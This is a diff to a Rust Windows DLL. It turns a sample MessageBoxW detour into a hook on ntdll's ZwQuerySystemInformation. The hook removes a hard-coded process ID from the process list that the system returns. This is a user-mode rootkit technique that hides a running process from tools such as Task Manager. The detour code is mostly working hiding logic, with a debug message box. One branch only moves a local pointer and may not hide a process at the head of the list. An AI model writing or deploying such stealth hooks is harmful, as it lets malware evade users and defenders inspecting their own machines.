@@ -1,46 +1,98 @@
 use retour::static_detour;
 use std::error::Error;
-use std::ffi::c_int;
-use std::os::raw::c_void;
+use std::os::raw::{c_ulong, c_void};
 use std::{ffi::CString, iter, mem};
+use windows::core::s;
 use windows::core::{PCSTR, PCWSTR};
-use windows::core::w;
-use windows::Win32::Foundation::{BOOL, HANDLE, HWND};
+use windows::Wdk::System::SystemInformation::{SystemProcessInformation, SYSTEM_INFORMATION_CLASS};
+use windows::Win32::Foundation::{BOOL, HANDLE, NTSTATUS, STATUS_SUCCESS};
 use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
 use windows::Win32::System::SystemServices::{
     DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
 };
+use windows::Win32::System::WindowsProgramming::SYSTEM_PROCESS_INFORMATION;
+use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
+
+const HIDE_PID: i32 = 30488;
 
 static_detour! {
-  static MessageBoxWHook: unsafe extern "system" fn(HWND, PCWSTR, PCWSTR, u32) -> c_int;
+    static ZwQuerySystemInformationHook: unsafe extern "system" fn(SYSTEM_INFORMATION_CLASS, *mut c_void, c_ulong, *mut c_ulong) -> NTSTATUS;
 }
 
-// A type alias for `MessageBoxW` (makes the transmute easy on the eyes)
-type FnMessageBoxW = unsafe extern "system" fn(HWND, PCWSTR, PCWSTR, u32) -> c_int;
+// A type alias for `ZwQuerySystemInformation` (makes the transmute easy on the eyes)
+type FnZwQuerySystemInformation = unsafe extern "system" fn(
+    SYSTEM_INFORMATION_CLASS,
+    *mut c_void,
+    c_ulong,
+    *mut c_ulong,
+) -> NTSTATUS;
 
 /// Called when the DLL is attached to the process.
 unsafe fn main() -> Result<(), Box<dyn Error>> {
-    // Retrieve an absolute address of `MessageBoxW`. This is required for
-    // libraries due to the import address table. If `MessageBoxW` would be
-    // provided directly as the target, it would only hook this DLL's
-    // `MessageBoxW`. Using the method below an absolute address is retrieved
-    // instead, detouring all invocations of `MessageBoxW` in the active process.
-    let address = get_module_symbol_address("user32.dll", "MessageBoxW")
-        .expect("could not find 'MessageBoxW' address");
-    let target: FnMessageBoxW = mem::transmute(address);
+    let address = get_module_symbol_address("ntdll.dll", "ZwQuerySystemInformation")
+        .expect("could not find 'ZwQuerySystemInformation' address");
+    let target: FnZwQuerySystemInformation = mem::transmute(address);
 
-    // Initialize AND enable the detour (the 2nd parameter can also be a closure)
-    MessageBoxWHook
-        .initialize(target, messageboxw_detour)?
+    ZwQuerySystemInformationHook
+        .initialize(target, zwquery_system_infomation_detour)?
         .enable()?;
     Ok(())
 }
 
-/// Called whenever `MessageBoxW` is invoked in the process.
-fn messageboxw_detour(hwnd: HWND, text: PCWSTR, _caption: PCWSTR, msgbox_style: u32) -> c_int {
-    // Call the original `MessageBoxW`, but replace the caption
-    let replaced_caption = w!("Detoured!");
-    unsafe { MessageBoxWHook.call(hwnd, text, replaced_caption, msgbox_style) }
+#[allow(unused_assignments)]
+/// Called whenever `ZwQuerySystemInformation` is invoked in the process.
+fn zwquery_system_infomation_detour(
+    system_infomation_class: SYSTEM_INFORMATION_CLASS,
+    mut system_infomation: *mut c_void,
+    system_infomation_length: c_ulong,
+    return_length: *mut c_ulong,
+) -> NTSTATUS {
+    let mut prev = 0;
+    let status = unsafe {
+        ZwQuerySystemInformationHook.call(
+            system_infomation_class,
+            system_infomation,
+            system_infomation_length,
+            return_length,
+        )
+    };
+    if status != STATUS_SUCCESS || system_infomation_class != SystemProcessInformation {
+        return status;
+    }
+
+    let mut psystem_information: *mut SYSTEM_PROCESS_INFORMATION =
+        unsafe { mem::transmute(system_infomation) };
+    loop {
+        if HIDE_PID == unsafe { (*psystem_information).UniqueProcessId.0 } as i32 {
+            let st = unsafe { format!("system information ==> {:#?}", *psystem_information) };
+            unsafe { MessageBoxA(None, PCSTR::from_raw(st.as_ptr()), s!("info"), MB_OK) };
+            if prev == 0 {
+                system_infomation = (psystem_information as u64
+                    + (unsafe { *psystem_information }).NextEntryOffset as u64)
+                    as *mut c_void;
+            } else if (unsafe { *psystem_information }).NextEntryOffset == 0 {
+                (unsafe { *(prev as *mut SYSTEM_PROCESS_INFORMATION) }).NextEntryOffset = 0;
+            } else {
+                unsafe {
+                    (*(prev as *mut SYSTEM_PROCESS_INFORMATION)).NextEntryOffset +=
+                        (*psystem_information).NextEntryOffset;
+                }
+            }
+            break;
+        } else {
+            prev = psystem_information as u64;
+        }
+
+        if unsafe { (*psystem_information).NextEntryOffset == 0 } {
+            break;
+        }
+
+        psystem_information =
+            unsafe { psystem_information as u64 + (*psystem_information).NextEntryOffset as u64 }
+                as *mut SYSTEM_PROCESS_INFORMATION;
+    }
+
+    status
 }
 
 /// Returns a module symbol's absolute address.
